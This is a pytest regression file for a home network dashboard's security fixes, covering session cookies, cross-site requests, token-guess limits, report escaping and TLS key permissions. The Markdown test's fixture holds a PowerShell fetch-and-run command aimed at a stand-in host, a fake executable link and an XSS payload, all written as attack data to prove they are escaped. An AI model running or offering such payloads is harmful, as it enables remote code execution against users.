"""Regression tests for the web-backend security review (2026-09-22).

Each test encodes one confirmed exploit against ``homesoc/web`` and asserts it now fails:

* a read-only Lens phone re-binding or wiping printed sticker mappings through /api/lens/learn;
* the dashboard cookie being ``web.token`` itself (any other server on 127.0.0.1 received it);
* GET pages that change state (/lens/pair, /lens/stickers) and heavy API reads reachable from
  another website when no token is set;
* unlimited, unrecorded guessing of the dashboard token;
* LAN-controlled strings forging sections, steps and links in the Markdown report;
* a control character in a device name making /feed.rss malformed XML;
* the Lens TLS key inheriting a folder ACL that other local accounts can read (Windows);
* Settings-page overrides that silently beat config.toml and could not be cleared;
* DNS dashboard aggregates scanning every raw query row under the shared lock;
* the devices list running a correlated subquery per device (quadratic under the lock).

Everything is offline: in-memory SQLite, Flask test clients, temporary directories.
"""

from __future__ import annotations

import os
import re
import sqlite3
import time
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

import test_lens_api as lens_tests
import test_web as web_tests
from homesoc import config as config_mod
from homesoc import db as core_db
from homesoc.web import api as webapi
from homesoc.web import create_app
from homesoc.web import lens as lensmod
from homesoc.web import summary as summarymod
from homesoc.web import tls as tlsmod

FETCH = {"X-Requested-With": "fetch"}
LAN = {"REMOTE_ADDR": "192.168.1.50"}
CROSS_SITE_IMG = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Dest": "image"}
CROSS_SITE_NAV = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}
TOKEN = "s3cret-token-value-xyz"


def _now(minutes_ago: float = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")


@pytest.fixture(autouse=True)
def _fresh_guess_counters():
    """The token-guess limiter is process-wide; every test starts (and ends) with a clean slate."""
    webapi._guesses.clear()
    yield
    webapi._guesses.clear()


@pytest.fixture
def lens_conn():
    conn = core_db.connect(":memory:")
    lens_tests.seed(conn)
    lensmod.reset_claim_limits(conn)
    try:
        yield conn
    finally:
        conn.close()


@pytest.fixture
def web_conn():
    conn = web_tests.fresh_conn()
    try:
        yield conn
    finally:
        conn.close()


def _web_client(conn: sqlite3.Connection, **web):
    app = create_app(web_tests.make_cfg(**web), conn)
    app.config["TESTING"] = True
    return app.test_client()


def _tag(conn: sqlite3.Connection, code: str) -> dict | None:
    return webapi.one(conn, "SELECT code, kind, device_id FROM lens_tags WHERE code=?", (code,))


# --------------------------------------------------------------------------- 1. Lens learn scope


def test_read_only_phone_cannot_rebind_or_wipe_a_printed_sticker(lens_conn):
    stickers = lensmod.mint_sticker_codes(lens_conn, [1, 3])
    phone = lens_tests.phone(lens_tests.paired(lens_conn, scopes="read"), **FETCH)
    client = lens_tests.client_for(lens_conn)  # allow_actions = false, tag_learning = true

    # The PoC: point the camera's sticker at another device, and turn another sticker into "ignored".
    r = client.post("/api/lens/learn", json={"code": stickers[1], "device_id": 2, "kind": "sticker"},
                    headers=phone, environ_base=LAN)
    assert r.status_code == 403
    r = client.post("/api/lens/learn", json={"code": stickers[1], "device_id": 2}, headers=phone, environ_base=LAN)
    assert r.status_code == 403 and r.get_json()["code"] == "actions_disabled"
    r = client.post("/api/lens/learn", json={"code": stickers[3], "device_id": None}, headers=phone, environ_base=LAN)
    assert r.status_code == 403

    assert _tag(lens_conn, stickers[1]) == {"code": stickers[1], "kind": "sticker", "device_id": 1}
    assert _tag(lens_conn, stickers[3]) == {"code": stickers[3], "kind": "sticker", "device_id": 3}
    body = client.post("/api/lens/identify", json={"code": stickers[1]}, headers=phone, environ_base=LAN).get_json()
    assert body["device_id"] == 1 and body["via"] == "sticker"
    # A reprinted sheet still carries the QR already stuck to the device.
    assert lensmod.mint_sticker_codes(lens_conn, [3]) == {3: stickers[3]}


def test_read_only_phone_may_only_add_codes_never_change_them(lens_conn):
    phone = lens_tests.phone(lens_tests.paired(lens_conn, scopes="read"), **FETCH)
    client = lens_tests.client_for(lens_conn)
    # B8 still works: a brand-new code can be learned or ignored.
    r = client.post("/api/lens/learn", json={"code": "0123456789012", "device_id": 1}, headers=phone, environ_base=LAN)
    assert r.status_code == 200 and r.get_json()["kind"] == "learned"
    r = client.post("/api/lens/learn", json={"code": "SOFA-BARCODE", "device_id": None}, headers=phone, environ_base=LAN)
    assert r.status_code == 200 and r.get_json()["kind"] == "ignored"
    # ...but once stored, it is not the read-only phone's to move or ignore.
    r = client.post("/api/lens/learn", json={"code": "0123456789012", "device_id": 2}, headers=phone, environ_base=LAN)
    assert r.status_code == 403
    r = client.post("/api/lens/learn", json={"code": "0123456789012", "device_id": None}, headers=phone, environ_base=LAN)
    assert r.status_code == 403
    assert _tag(lens_conn, "0123456789012")["device_id"] == 1
    # And a phone can never mint a "sticker" row, which the printed sheet would then reuse.
    r = client.post("/api/lens/learn", json={"code": "RANDOM-BARCODE", "device_id": 1, "kind": "sticker"},
                    headers=phone, environ_base=LAN)
    assert r.status_code == 403 and _tag(lens_conn, "RANDOM-BARCODE") is None


def test_phone_with_act_scope_and_the_dashboard_can_still_relearn(lens_conn):
    stickers = lensmod.mint_sticker_codes(lens_conn, [1])
    lensmod.learn_tag(lens_conn, "MOVE-ME", 1)
    full = lens_tests.phone(lens_tests.paired(lens_conn, scopes="read act"), **FETCH)
    acting = lens_tests.client_for(lens_conn, allow_actions=True)
    r = acting.post("/api/lens/learn", json={"code": "MOVE-ME", "device_id": 2}, headers=full, environ_base=LAN)
    assert r.status_code == 200 and _tag(lens_conn, "MOVE-ME")["device_id"] == 2
    r = acting.post("/api/lens/learn", json={"code": "X-9", "device_id": 2, "kind": "sticker"}, headers=full, environ_base=LAN)
    assert r.status_code == 403 and r.get_json()["code"] == "sticker_kind"
    # The owner at this machine (loopback, tokenless) keeps full control, as with DELETE.
    desk = lens_tests.client_for(lens_conn)
    r = desk.post("/api/lens/learn", json={"code": stickers[1], "device_id": 2}, headers=FETCH)
    assert r.status_code == 200 and _tag(lens_conn, stickers[1]) == {"code": stickers[1], "kind": "sticker", "device_id": 2}


def test_learn_tag_insert_only_mode_refuses_existing_codes(lens_conn):
    lensmod.learn_tag(lens_conn, "KNOWN", 1)
    with pytest.raises(lensmod.TagExists):
        lensmod.learn_tag(lens_conn, " KNOWN ", 2, overwrite=False)  # normalised before the check
    assert _tag(lens_conn, "KNOWN")["device_id"] == 1
    assert lensmod.learn_tag(lens_conn, "FRESH", 2, overwrite=False) > 0


# --------------------------------------------------------------------------- 2. session cookie


def _cookie_header(resp) -> str:
    return "; ".join(resp.headers.getlist("Set-Cookie"))


def test_session_cookie_is_never_the_token_and_cannot_be_replayed_as_x_token(web_conn):
    c = _web_client(web_conn, token=TOKEN)
    r = c.get(f"/login?token={TOKEN}")
    assert r.status_code == 302
    header = _cookie_header(r)
    assert "homesoc_token=" in header and TOKEN not in header
    sid = c.get_cookie("homesoc_token").value
    assert sid and sid != TOKEN
    assert c.get("/").status_code == 200
    # What a thief on another loopback port receives is not the master credential.
    fresh = _web_client(web_conn, token=TOKEN)
    assert fresh.get("/api/settings", headers={"X-Token": sid}).status_code == 401
    # The database only ever holds a hash of the session id.
    stored = [r["key"] for r in webapi.rows(web_conn, "SELECT key FROM settings WHERE key LIKE 'websession.%'")]
    assert stored and all(sid not in k for k in stored)


def test_logout_revokes_the_session_on_the_server(web_conn):
    c = _web_client(web_conn, token=TOKEN)
    c.get(f"/login?token={TOKEN}")
    sid = c.get_cookie("homesoc_token").value
    assert c.get("/logout").status_code == 302
    replay = _web_client(web_conn, token=TOKEN)
    replay.set_cookie("homesoc_token", sid)
    assert replay.get("/").status_code == 401
    assert replay.get("/api/summary").status_code == 401
    # Another site cannot sign the owner out either.
    c.get(f"/login?token={TOKEN}")
    r = c.get("/logout", headers=CROSS_SITE_NAV)
    assert r.status_code == 403 and "homesoc_token=" not in _cookie_header(r)
    assert c.get("/").status_code == 200


def test_changing_the_token_signs_every_browser_out(web_conn):
    c = _web_client(web_conn, token=TOKEN)
    c.get(f"/login?token={TOKEN}")
    sid = c.get_cookie("homesoc_token").value
    same = _web_client(web_conn, token=TOKEN)  # a restart with the same token keeps sessions
    same.set_cookie("homesoc_token", sid)
    assert same.get("/").status_code == 200
    rotated = _web_client(web_conn, token="a-completely-new-token-123")
    rotated.set_cookie("homesoc_token", sid)
    assert rotated.get("/").status_code == 401


def test_tls_cookie_uses_the_host_prefix_and_login_accepts_a_form_post(web_conn):
    c = _web_client(web_conn, token=TOKEN)
    r = c.post("/login", data={"token": TOKEN}, base_url="https://localhost")  # a plain form: no X-Requested-With
    assert r.status_code == 302
    header = _cookie_header(r)
    assert "__Host-homesoc_token=" in header and "Secure" in header and "Path=/" in header and TOKEN not in header
    assert c.get("/", base_url="https://localhost").status_code == 200


# --------------------------------------------------------------------------- 3. cross-site requests


def test_cross_site_get_cannot_mint_stickers_or_void_a_pairing_code(lens_conn):
    c = lens_tests.client_for(lens_conn)  # tokenless, Lens on
    before = webapi.scalar(lens_conn, "SELECT count(*) FROM lens_tags")
    for headers in (CROSS_SITE_IMG, CROSS_SITE_NAV, {"Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "no-cors"}):
        r = c.get("/lens/stickers?which=all", headers=headers, base_url="http://127.0.0.1")
        assert r.status_code == 403, headers
    assert webapi.scalar(lens_conn, "SELECT count(*) FROM lens_tags") == before

    code = core_db.lens_new_pairing_code(lens_conn)
    assert c.get("/lens/pair", headers=CROSS_SITE_IMG, base_url="http://127.0.0.1").status_code == 403
    assert core_db.lens_consume_pairing_code(lens_conn, code), "the code on the owner's screen still works"

    # The owner's own navigation shows the sheet but mints nothing (GET never changes state);
    # the page's own same-origin "Create codes" form does.
    r = c.get("/lens/stickers?which=all", headers={"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate"},
              base_url="http://127.0.0.1")
    assert r.status_code == 200 and webapi.scalar(lens_conn, "SELECT count(*) FROM lens_tags") == before
    r = c.post("/lens/stickers", data={"which": "all"},
               headers={"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate"}, base_url="http://127.0.0.1")
    assert r.status_code == 200 and webapi.scalar(lens_conn, "SELECT count(*) FROM lens_tags") > before


def test_cross_site_api_reads_are_refused_but_links_to_pages_still_work(web_conn):
    web_tests.seed(web_conn)
    c = _web_client(web_conn)  # no token: the case where SameSite cookies protect nothing
    for path in ("/api/dns/series?hours=336", "/api/devices", "/api/summary", "/api/export"):
        assert c.get(path, headers=CROSS_SITE_IMG).status_code == 403, path
    assert c.get("/api/devices", headers={"Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors"}).status_code == 403
    # Without fetch metadata, a foreign Origin is refused the same way.
    assert c.get("/api/devices", headers={"Origin": "http://127.0.0.1:9999"}).status_code == 403
    assert c.post("/api/scan", json={"kind": "quick"}, headers={**FETCH, "Origin": "https://evil.example"}).status_code == 403
    # Legitimate traffic.
    assert c.get("/", headers=CROSS_SITE_NAV).status_code == 200  # a bookmark or link to the dashboard
    assert c.get("/static/style.css", headers=CROSS_SITE_IMG).status_code == 200
    assert c.get("/api/devices", headers={"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors"}).status_code == 200
    assert c.get("/api/devices", headers={"Origin": "http://localhost"}).status_code == 200
    assert c.get("/api/devices").status_code == 200  # curl / scripts send neither header


# --------------------------------------------------------------------------- 4. token guessing


def test_token_guesses_are_limited_per_source_and_recorded(web_conn):
    c = _web_client(web_conn, token="sunset42-but-longer")
    guesser = {"REMOTE_ADDR": "192.168.1.66"}
    for i in range(webapi.TOKEN_GUESS_LIMIT):
        assert c.get("/api/summary", headers={"X-Token": f"guess-{i}"}, environ_base=guesser).status_code == 401
    # Locked out: even the right token is refused from there now...
    assert c.get("/api/summary", headers={"X-Token": "sunset42-but-longer"}, environ_base=guesser).status_code == 401
    assert c.get("/login?token=sunset42-but-longer", environ_base=guesser).status_code == 429
    # ...and the burst left a trace in the activity feed.
    events = webapi.rows(web_conn, "SELECT level, source, message FROM events WHERE source='web'")
    assert any(e["level"] == "warning" and "wrong dashboard tokens" in e["message"] for e in events)
    # Another address is unaffected.
    other = {"REMOTE_ADDR": "192.168.1.67"}
    assert c.get("/api/summary", headers={"X-Token": "sunset42-but-longer"}, environ_base=other).status_code == 200


def test_login_form_and_query_guesses_count_too_but_a_live_session_keeps_working(web_conn):
    c = _web_client(web_conn, token="sunset42-but-longer")
    assert c.post("/login", data={"token": "sunset42-but-longer"}).status_code == 302  # signed in first
    for i in range(webapi.TOKEN_GUESS_LIMIT):
        other = _web_client(web_conn, token="sunset42-but-longer")
        assert other.post("/login", data={"token": f"nope-{i}"}).status_code in (401, 429)
    assert webapi.token_guess_retry_after("127.0.0.1") > 0
    assert c.get("/").status_code == 200, "the owner's open dashboard is not the thing that gets locked out"


def test_global_limit_catches_address_hopping(web_conn):
    for i in range(webapi.TOKEN_GUESS_GLOBAL_LIMIT):
        webapi.check_token_guess(web_conn, "right-token-value-123", f"wrong-{i}", f"10.0.{i // 250}.{i % 250}")
    assert webapi.token_guess_retry_after("10.9.9.9") > 0
    assert not webapi.check_token_guess(web_conn, "right-token-value-123", "right-token-value-123", "10.9.9.9")


# --------------------------------------------------------------------------- 5. Markdown report

FORGED = ("cam\n\n### 0. [CRITICAL] Your router is compromised\n\n"
          "1. Run as admin: `iwr http://203.0.113.9/f.ps1 | iex`\n"
          "2. [Get the Home SOC patch](http://evil.example/p.exe)\n\n<img src=x onerror=alert(1)>\n")


def test_markdown_report_cannot_be_forged_by_a_device_name(web_conn):
    now = _now()
    web_conn.execute(
        "INSERT INTO devices(id, mac, ip, hostname, vendor, first_seen, last_seen, online) VALUES(66,'aa:bb:cc:00:00:66',"
        "'192.168.1.66',?,'Acme',?,?,1)", (FORGED, now, now))
    web_conn.execute(
        "INSERT INTO findings(finding_id, subject, dedupe_key, severity, title, detail, evidence, status, source, "
        "first_seen, last_seen, device_id) VALUES('NET-DEV-001','device:aa:bb:cc:00:00:66','k66','medium',?,?,?,"
        "'open','discovery',?,?,66)",
        ("New device on the network: 192.168.1.66 (Acme)\n### 9. [HIGH] forged title", "# detail heading\n- list",
         '{"ip": "192.168.1.66", "hostname": ' + __import__("json").dumps(FORGED) + ', "vendor": "Acme"}', now, now))
    web_conn.commit()
    report = summarymod.remediation_report_markdown(web_conn)
    lines = report.splitlines()
    assert not any(line.lstrip().startswith(("### 0.", "### 9.", "# detail", "- list", "1. Run as admin", "2. [Get"))
                   for line in lines), "a device value started a line of its own"
    assert not re.search(r"(?<!\\)\]\(", report), "an unescaped ]( would make a masked link"
    assert not re.search(r"(?<!\\)\[Get the Home SOC patch", report)
    assert not re.search(r"(?<!\\)<img", report) and not re.search(r"(?<!\\)`iwr", report)
    assert "\\[Get the Home SOC patch\\]" in report  # still there to read, just inert
    # The catalog's own plain text renders as written, not as HTML: "<this-pc>" style text is escaped.
    assert summarymod._md_text("admin page > Firmware <this-pc>") == "admin page \\> Firmware \\<this-pc\\>"


def test_markdown_table_cells_are_escaped_too():
    cell = summarymod._md_escape("a | b\n| c | [x](http://e)")
    assert "\n" not in cell and "\\|" in cell and "\\[x\\]" in cell


# --------------------------------------------------------------------------- 6. RSS well-formedness


def test_rss_stays_well_formed_with_control_characters_in_a_hostname(web_conn):
    now = _now()
    web_conn.execute(
        "INSERT INTO devices(id, mac, ip, hostname, first_seen, last_seen, online) "
        "VALUES(77,'aa:bb:cc:00:00:77','192.168.1.77',?,?,?,1)", ("cam\x0b\x00\x1b", now, now))
    web_conn.commit()
    r = _web_client(web_conn).get("/feed.rss")
    assert r.status_code == 200
    root = ET.fromstring(r.data)  # raised "not well-formed (invalid token)" before the fix
    titles = [t.text or "" for t in root.iter("title")]
    assert any("New device joined the network: cam" in t for t in titles)


# --------------------------------------------------------------------------- 7. TLS key ACL (Windows)


windows_only = pytest.mark.skipif(os.name != "nt", reason="Windows ACL behaviour")


def _icacls(path: Path) -> str:
    from homesoc import util

    rc, out, _err = util.run_cmd([tlsmod._system32("icacls.exe"), str(path)], timeout=30)
    assert rc == 0
    return out


@windows_only
def test_private_key_gets_an_explicit_owner_only_acl(tmp_path):
    key = tmp_path / "tls" / "key.pem"
    tlsmod._write_private(key, b"-----BEGIN PRIVATE KEY-----\nx\n-----END PRIVATE KEY-----\n")
    acl = _icacls(key)
    assert "(I)" not in acl, "the key must not inherit the folder's ACL"
    assert key.read_bytes().startswith(b"-----BEGIN")


@windows_only
def test_a_key_that_inherited_a_shared_folder_acl_is_not_reused(tmp_path, monkeypatch):
    pytest.importorskip("cryptography")
    monkeypatch.setenv("HOMESOC_DATA", str(tmp_path / "data"))
    cert, key = tlsmod.ensure_cert(["192.168.1.50"])
    first = tlsmod.cert_fingerprint_sha256(cert)
    assert tlsmod.ensure_cert(["192.168.1.50"]) == (cert, key)
    assert tlsmod.cert_fingerprint_sha256(cert) == first, "a key this module protected is reused"
    # Simulate an older install (or a planted pair) in a folder outside the profile: inherited ACL.
    key.unlink()
    key.write_bytes(b"planted")
    assert "(I)" in _icacls(key)
    monkeypatch.setattr(tlsmod, "_inside_user_profile", lambda _p: False)
    tlsmod.ensure_cert(["192.168.1.50"])
    assert tlsmod.cert_fingerprint_sha256(cert) != first and key.read_bytes() != b"planted"
    assert "(I)" not in _icacls(key)


# --------------------------------------------------------------------------- 8. settings overrides


def test_settings_overrides_can_be_cleared_and_shadowing_is_flagged(web_conn, tmp_path, monkeypatch):
    toml = tmp_path / "config.toml"
    toml.write_text('[notify]\ndiscord_webhook = "https://discord.com/api/webhooks/2/ROTATED"\n', encoding="utf-8")
    monkeypatch.setenv("HOMESOC_CONFIG", str(toml))
    # Signed in: a dashboard with no password refuses to change where alerts go (security round 3).
    c = _web_client(web_conn, token=TOKEN)
    c.get(f"/login?token={TOKEN}")
    leaked = "https://discord.com/api/webhooks/1/LEAKED"
    assert c.post("/api/settings", json={"notify.discord_webhook": leaked}, headers=FETCH).get_json()["saved"]
    # The PoC: config.toml was rotated, the database override still wins...
    assert config_mod.load(web_conn, toml).notify.discord_webhook == leaked
    item = next(s for s in c.get("/api/settings").get_json() if s["key"] == "notify.discord_webhook")
    assert item["source"] == "override" and item["shadows_config"] is True and item["clearable"] is True
    assert item["value"] == ""  # still never echoed
    assert webapi.warn_shadowed_overrides(web_conn) == ["notify.discord_webhook"]
    assert any("overriding config.toml" in e["message"] for e in webapi.rows(web_conn, "SELECT message FROM events"))
    # ...until the override is cleared, which is now possible.
    r = c.post("/api/settings/clear", json={"keys": ["notify.discord_webhook"]}, headers=FETCH)
    assert r.status_code == 200 and r.get_json()["cleared"] == ["notify.discord_webhook"]
    assert config_mod.load(web_conn, toml).notify.discord_webhook.endswith("/ROTATED")
    assert c.post("/api/settings/clear", json={"keys": ["general.name"]}, headers=FETCH).status_code == 400
    assert c.post("/api/settings/clear", json={"keys": ["web.port"]}).status_code == 403  # CSRF header still required


def test_clearing_a_token_override_signs_browsers_out(web_conn):
    c = _web_client(web_conn, token=TOKEN)
    c.get(f"/login?token={TOKEN}")
    webapi.set_setting(web_conn, "web.token", "override-token-value-1")
    assert c.delete("/api/settings/web.token", headers=FETCH).get_json()["cleared"] == ["web.token"]
    assert webapi.scalar(web_conn, "SELECT count(*) FROM settings WHERE key LIKE 'websession.%'") == 0


# --------------------------------------------------------------------------- 9. DNS aggregates


def _insert_queries(conn: sqlite3.Connection, hours: int, per_hour: int) -> None:
    rows = []
    base = datetime.now(timezone.utc)
    for h in range(hours):
        for i in range(per_hour):
            ts = (base - timedelta(hours=h, minutes=(i * 7) % 60)).strftime("%Y-%m-%dT%H:%M:%SZ")
            rows.append((ts, f"192.168.1.{10 + i % 3}", "x.example", "A", "block" if i % 4 == 0 else "allow", None, 1.0))
    conn.executemany("INSERT INTO dns_queries(ts, client, qname, qtype, action, reason, ms) VALUES(?,?,?,?,?,?,?)", rows)
    conn.commit()


def test_dns_counts_use_the_rollup_and_match_raw_counts(web_conn):
    from homesoc.dnsfilter import querylog

    _insert_queries(web_conn, 30, 20)
    raw = webapi.one(web_conn, "SELECT count(*) AS total, sum(action='block') AS blocked, count(DISTINCT client) AS clients "
                               "FROM dns_queries WHERE ts>=?", (webapi.cutoff_iso(24),))
    querylog.rollup(web_conn, hours_back=48)
    hybrid = webapi.dns_window_counts(web_conn, 24)
    assert hybrid == {"total": raw["total"], "blocked": raw["blocked"], "clients": raw["clients"]}
    series = webapi.dns_series(web_conn, 24)
    assert sum(p["total"] for p in series) <= raw["total"] and len(series) == 24
    # Proof the middle of the window is read from dns_hourly, not rescanned row by row: drop the
    # raw rows of the whole hours in the middle and the answer does not move.
    since, first_hourly, newest = webapi._dns_window(web_conn, 24)
    assert newest is not None
    web_conn.execute("DELETE FROM dns_queries WHERE ts>=? AND ts<?", (webapi._hour_to_ts(first_hourly), webapi._hour_to_ts(newest)))
    web_conn.commit()
    assert webapi.dns_window_counts(web_conn, 24) == hybrid
    clients = {r["client"]: r["total"] for r in webapi.dns_top(web_conn, "clients", 24)}
    assert sum(clients.values()) == raw["total"]


def test_slow_aggregates_are_reused_instead_of_rerun(web_conn, monkeypatch):
    c = webapi.WebContext(cfg=web_tests.make_cfg(), conn=web_conn)
    calls = []

    def slow():
        calls.append(1)
        time.sleep(0.02)
        return {"n": len(calls)}

    monkeypatch.setattr(webapi, "SLOW_QUERY_SECONDS", 0.01)
    assert webapi.throttled(c, ("k",), slow) == {"n": 1}
    assert webapi.throttled(c, ("k",), slow) == {"n": 1}
    assert len(calls) == 1
    monkeypatch.setattr(webapi, "SLOW_QUERY_SECONDS", 10.0)
    fast = []
    webapi.throttled(c, ("f",), lambda: fast.append(1))
    webapi.throttled(c, ("f",), lambda: fast.append(1))
    assert len(fast) == 2, "fast answers are never cached"


# --------------------------------------------------------------------------- 10. devices list


def _old_devices_counts(conn: sqlite3.Connection) -> dict[int, tuple[int, int]]:
    rows = webapi.rows(
        conn,
        "SELECT d.id, "
        "(SELECT count(*) FROM services s WHERE s.device_id=d.id AND s.state='open') AS open_ports, "
        "(SELECT count(*) FROM findings f WHERE f.status='open' AND "
        " (f.device_id=d.id OR f.subject=('device:'||d.mac) OR f.subject LIKE ('device:'||d.mac||':%'))) AS open_findings "
        "FROM devices d",
    )
    return {int(r["id"]): (int(r["open_ports"]), int(r["open_findings"])) for r in rows}


def test_devices_list_counts_match_the_old_query(web_conn):
    web_tests.seed(web_conn)
    now = _now()
    extra = [
        ("NET-SVC-001", "device:00:11:22:00:00:01:23", None),  # matched by MAC prefix only
        ("NET-DEV-001", "device:ip:192.168.1.40", None),       # matched by the whole subject
        ("NET-SVC-002", "device:00:11:22:00:00:01", 2),         # device_id says 2, subject says 1
        ("NET-SVC-003", "wan:1.2.3.4", None),                   # nobody's
    ]
    for i, (fid, subject, device_id) in enumerate(extra):
        web_conn.execute(
            "INSERT INTO findings(finding_id, subject, dedupe_key, severity, title, status, source, first_seen, "
            "last_seen, device_id) VALUES(?,?,?,?,?,'open','t',?,?,?)",
            (fid, subject, f"extra-{i}", "low", "t", now, now, device_id))
    web_conn.commit()
    expected = _old_devices_counts(web_conn)
    got = {int(d["id"]): (d["open_ports"], d["open_findings"]) for d in webapi.devices_list(web_conn)}
    assert got == expected


def test_devices_list_stays_linear_under_mac_churn(web_conn):
    """The PoC: 4000 devices with 2 open findings each took ~20 s under the lock; now it is linear."""
    now = _now()
    n = 4000
    web_conn.executemany(
        "INSERT INTO devices(id, mac, ip, first_seen, last_seen, online) VALUES(?,?,?,?,?,1)",
        [(i, f"02:00:00:{i >> 16 & 255:02x}:{i >> 8 & 255:02x}:{i & 255:02x}", f"10.0.{i >> 8 & 255}.{i & 255}", now, now)
         for i in range(1, n + 1)])
    web_conn.executemany(
        "INSERT INTO findings(finding_id, subject, dedupe_key, severity, title, status, source, first_seen, last_seen, "
        "device_id) VALUES(?,?,?,?,?,'open','discovery',?,?,?)",
        [(fid, f"device:02:00:00:{i >> 16 & 255:02x}:{i >> 8 & 255:02x}:{i & 255:02x}", f"{fid}-{i}", "medium", "t", now, now, i)
         for i in range(1, n + 1) for fid in ("NET-DEV-001", "NET-DEV-002")])
    web_conn.commit()
    started = time.monotonic()
    data = webapi.devices_list(web_conn)
    assert time.monotonic() - started < 3.0
    assert len(data) == n and all(d["open_findings"] == 2 for d in data)
